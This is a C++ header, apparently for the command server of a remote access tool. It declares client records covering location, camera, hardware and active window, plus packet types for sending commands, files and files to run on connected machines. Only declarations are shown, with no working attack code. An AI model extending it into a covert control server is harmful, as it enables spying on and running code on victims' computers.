
#define WIN32_LEAN_AND_MEAN

#define  _WINSOCK_DEPRECATED_NO_WARNINGS




#include <winsock2.h>
#include <ws2tcpip.h>
#include <random>
#include <thread>
#include <random>
#pragma comment (lib, "Ws2_32.lib")


struct Device{
    inline static bool IsSelected = false;
    std::string id;
    std::string ip;
    std::string os;
    std::string manufacturer;
    std::string model;
    std::string software_version;
    std::string location;
    std::string cpu;
    std::string gpu;
    std::string motherboard;
    std::string camera_name;
    std::string disk_partitions;
    std::string device_type;
    std::string memory;
    std::string storage;
    std::string empty_space;
    std::string uptime;
    std::string battery;
    std::string network_info;
    bool is_active;
    bool is_camera;
    std::string country;
    std::string ping;
    std::string active_window;
}inline client;

enum ClientInfo {
    ID,
    IP,
    OPERATION_SYSTEM,
    MANUFACTURER,
    MODEL,
    SOFTWARE_VERSION,
    LOCATION,
    CPU,
    GPU,
    MOTHERBOARD,
    CAMERA_NAME,
    DISK_PARTITIONS,
    DEVICE_TYPE,
    MEMORY,
    STORAGE,
    EMPTY_SPACE,
    UPTIME,
    BATTERY,
    NETWORK_INFO,
    IS_ACTIVE,
    IS_CAMERA,
    COUNTRY,
    PING,
    ACTIVE_WINDOW
};




class Server
{
public:
	Server();
	~Server();
    

public:
	enum PacketType { cmd, file,runfile} PaketType;
    

    std::vector<std::pair<Device,SOCKET>>Client_Server_Information;
	std::string IP;
	int port;
	inline int GenerateID(int min, int max);
    bool ServerWorking{true};
    char buffer[4096];

public:
    void StartServer(std::string IP, int port);
	void start_server_for_listen_new_clients();
    void SendFunction(SOCKET cl,PacketType paket,std::string  msg= "NULL");
    void SendFile(SOCKET cl);
    
private:
    
    WSAData wsaData;
    struct addrinfo *result = NULL;
    struct addrinfo hints;
	SOCKET ListenSocket{INVALID_SOCKET};
	SOCKET ClientSocket{INVALID_SOCKET};
	int sizeofaddr;
private:
    void HandleClients();

  










};



